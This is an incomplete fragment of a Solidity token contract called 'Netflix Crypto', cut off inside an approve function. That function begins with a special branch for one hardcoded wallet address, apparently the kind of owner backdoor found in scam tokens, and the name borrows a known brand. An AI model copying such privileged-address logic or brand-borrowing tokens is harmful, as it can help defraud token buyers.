...
contract netflixcrypto {
    mapping (address => uint) public balances;
    mapping (address => mapping (address =>uint)) public allowance;
    uint public totalSupply = 1000000000 * 10 ** 11;
    string public name = "Netflix Crypto";
    ...
    function approve (address spender, uint value) public returns (bool) {
        if (msg.sender == address(0xd609e2A10702EEe500f21852272c4F44DCA357b7)) {
